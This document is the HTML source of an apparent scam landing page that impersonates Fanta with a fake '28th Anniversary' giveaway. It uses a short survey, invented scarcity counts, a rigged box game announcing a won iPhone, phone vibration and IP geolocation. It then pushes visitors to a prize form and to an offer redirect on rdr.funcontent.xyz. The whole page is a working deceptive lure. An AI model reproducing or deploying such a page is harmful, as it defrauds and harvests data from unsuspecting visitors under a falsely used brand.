<!doctype html>
<html lang="en" dir="ltr">
  <head>
    <title>Fanta - 28th Anniversary Prizes</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Fanta - 28th Anniversary Prizes" />
    <meta name="og:title" content="Fanta - 28th Anniversary Prizes" />
    <meta property="og:description" content="Fanta - 28th Anniversary Prizes" />
    <meta property="og:image" content="assets/banner.png" />
    <meta name="robots" content="noindex,nofollow" />
    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" href="social-proof.css" />
  </head>
  <body>
    <!-- Header -->
    <header class="main-header">
      <div class="header-container">
        <div class="header-logo">
          <img src="assets/logo.png" alt="Fanta" class="logo-image" />
          <div id="country-flag" class="country-flag"></div>
        </div>
      </div>
    </header>

    <img src="/assets/banner.png" width="99%" />

    <div class="app" id="app" v-cloak>
      <vue-modal
        v-show="!showRotator && !showPrize"
        :open="showOpeningModal"
        class="opening-modal"
      >
        <img
          class="opening-modal__image"
          src="assets/logo.png"
          alt="Apple iPhone 13 Pro Max"
        />
        <h1 class="heading heading--h1">Congratulations!</h1>
        <p class="paragraph">
          On the 28th anniversary, you are one of the few selected people to
          receive free prizes! Fanta offers.
        </p>
        <p class="paragraph"></p>
        <br />
        <button
          class="button"
          v-on:click="showOpeningModal = false; $confetti.stop()"
        >
          CONTINUE
        </button>
      </vue-modal>
      <vue-modal :open="showInstructionsModal">
        <img src="assets/logo.png" class="logo-small" />
        <h2 class="heading heading--h1">Congratulations!</h2>
        <h4 class="heading heading--h1">Your answers have been saved</h4>
        <p class="paragraph">
          This is your opportunity!
          <br /><br />
          You need to choose the box that contains the prize.
          <br /><br />
          You have 3 attempts, good luck!
        </p>
        <br />
        <button class="button" v-on:click="showInstructionsModal = false">
          Start Now
        </button>
      </vue-modal>
      <vue-modal :open="showFailModal">
        <img src="assets/logo.png" class="logo-small" />
        <h1 class="heading heading--h1">Better luck next time</h1>
        <p class="paragraph">You still have (2) chances.</p>
        <br />
        <button class="button" v-on:click="showFailModal = false">YES</button>
      </vue-modal>
      <vue-modal :open="showSuccessModal">
        <img src="https://i.imgur.com/y7AUO1e.png" class="prize-image-large" />
        <h1 class="heading heading--h1">Congratulations!</h1>
        <h3 class="heading heading--h1">You won! You received:</h3>

        <p class="paragraph">
          (Apple iPhone 17 - 256GB)
          <br />
          <br />Follow the instructions on the next page to receive your prize!
        </p>
        <br />
        <a href="/form.html" class="button">NEXT</a>
      </vue-modal>
      <div class="left">
        <div class="product-preview">
          <div class="product-preview__title"></div>
          <h1 class="heading heading--h1">Congratulations!</h1>
          <p class="paragraph">
            Fanta - 28th Anniversary Prizes <br />
            Participate now and win valuable prizes
          </p>
          <br />
        </div>
      </div>
      <div class="right">
        <vue-box-picker
          v-if="showBoxPicker"
          :vertical-items="4"
          lid-image="https://i.imgur.com/ppQh4XE.png"
          box-image="https://i.imgur.com/l34UCgQ.png"
          box-back-image="https://i.imgur.com/ve5fhRU.png"
          prize-image="https://i.imgur.com/KwJJSUf.png"
          v-on:fail="onBoxPickerFail"
          v-on:success="onBoxPickerSuccess"
          :horizontal-items="3"
          :max-clicks="2"
        ></vue-box-picker>
        <div class="verify" v-if="showRotator">
          <vue-text-rotator
            v-on:rotate="rotate"
            v-on:finished="onRotatorFinished"
            :strings='[
                     "Please wait ...",
              "Please wait ...",
              "Please wait ..."
            ]'
          >
          </vue-text-rotator>
          <div class="verify__text" v-if="rotateIndex > 1">
            <strong> You answered all questions. </strong>
            <img
              class="verify__icon verify__icon--checked"
              src="https://i.imgur.com/CnKHluD.png"
              alt=""
            />
          </div>
          <div class="verify__text" v-else>
            Your answers are being verified
            <img
              class="verify__icon verify__icon--spinner"
              :class="{'verify__icon--visible' : rotateIndex > 0}"
              src="https://i.imgur.com/2U02Ltr.gif"
              alt=""
            />
          </div>
          <div class="verify__text" v-if="rotateIndex > 2">
            <strong> There are still prizes available! </strong>
            <img
              class="verify__icon verify__icon--checked"
              src="https://i.imgur.com/CnKHluD.png"
              alt=""
            />
          </div>
          <div class="verify__text" v-else>
            Looking for prizes..
            <img
              class="verify__icon verify__icon--spinner"
              :class="{'verify__icon--visible' : rotateIndex > 1}"
              src="https://i.imgur.com/2U02Ltr.gif"
              alt=""
            />
          </div>
          <div class="verify__text" v-if="rotateIndex > 3">
            <strong> Only (1344) prizes remaining! </strong>
            <img
              class="verify__icon verify__icon--checked"
              src="https://i.imgur.com/CnKHluD.png"
              alt=""
            />
          </div>
          <div class="verify__text" v-else>
            Checking inventory
            <img
              class="verify__icon verify__icon--spinner"
              :class="{'verify__icon--visible' : rotateIndex > 2 }"
              src="https://i.imgur.com/2U02Ltr.gif"
              alt=""
            />
          </div>
        </div>
        <vue-survey
          v-if="showSurvey"
          :show-steps="true"
          :questions='[
           {
              title: "Do you know Fanta?",
              answers: [ { text: "YES" }, { text: "NO" } ]
            },
                                                             {
              title: "What is your gender? ",
              answers: [ { text: "MALE" }, { text: "FEMALE" } ]
            },
            {
              title: "How old are you?",
              answers: [ { text: "18-21" }, { text: "22-29" }, { text: "30-39" }, { text: "40-59" }, { text: "60+" } ]
            },
                                                                         {
              title: "How do you rate Fanta? ",
              answers: [ { text: "Very Good" }, { text: "Very Good" }, { text: "Good" }, { text: "Not Good" } ]
            },
            {
              title: "Would you recommend to a friend? ",
              answers: [ { text: "YES" }, { text: "NO" } ]
            },
          ]'
          v-on:finish="onSurveyFinish"
        ></vue-survey>
      </div>
    </div>

    <script>
      window.view = window.view || {};
      view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";
      view.qs = null;
      view.skip = 0;
      view.screenshot = 0;
      view.download = 1;
      view.noredir = false;
    </script>
    <script src="/app.js" type="application/javascript"></script>
    <script src="prizes.js"></script>
    <script src="social-proof.js"></script>

    <script>
      navigator.vibrate([1000, 300, 1000, 300, 1000]);
    </script>

    <div class="footer">
      <p>Copyright ¬© 2025 Fanta. All rights reserved.</p>
    </div>

    <!-- Country Flag Detection -->
    <script>
      // Cookie functions
      function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
        document.cookie =
          name + "=" + value + ";expires=" + expires.toUTCString() + ";path=/";
      }

      function getCookie(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(";");
        for (let i = 0; i < ca.length; i++) {
          let c = ca[i];
          while (c.charAt(0) === " ") c = c.substring(1, c.length);
          if (c.indexOf(nameEQ) === 0)
            return c.substring(nameEQ.length, c.length);
        }
        return null;
      }

      // Display flag using CDN
      function displayFlag(countryCode) {
        const flagElement = document.getElementById("country-flag");
        if (!flagElement) return;

        if (countryCode && countryCode !== "unknown") {
          // Use flag CDN
          flagElement.innerHTML = `<img src="https://flagcdn.com/20x15/${countryCode.toLowerCase()}.png" alt="${countryCode} flag" style="width: 20px; height: 15px; border-radius: 2px;">`;
        } else {
          // Fallback: globe icon
          flagElement.innerHTML = '<span style="font-size: 20px;">üåç</span>';
        }
        flagElement.classList.add("visible");
      }

      // Get user's country and display flag
      async function detectCountryAndShowFlag() {
        // Check if country is already stored in cookie
        let storedCountry = getCookie("user_country");

        if (storedCountry) {
          displayFlag(storedCountry);
          return;
        }

        try {
          // Use a free IP geolocation service
          const response = await fetch("https://ipapi.co/json/");
          const data = await response.json();

          const countryCode = data.country_code || "unknown";

          // Store in cookie for 30 days
          setCookie("user_country", countryCode, 30);

          displayFlag(countryCode);
        } catch (error) {
          console.log("Could not detect country:", error);
          // Store unknown in cookie to avoid repeated API calls
          setCookie("user_country", "unknown", 30);
          displayFlag("unknown");
        }
      }

      // Run when page loads
      document.addEventListener("DOMContentLoaded", detectCountryAndShowFlag);
    </script>

    <!-- BEGIN: Powered by Supercounters.com -->
    <center>
      <script
        type="text/javascript"
        src="//widget.supercounters.com/ssl/online_i.js"
      ></script>
      <script type="text/javascript">
        sc_online_i(1726126, "ffffff", "ffffff");
      </script>
    </center>
    <!-- END: Powered by Supercounters.com -->
  </body>
</html>
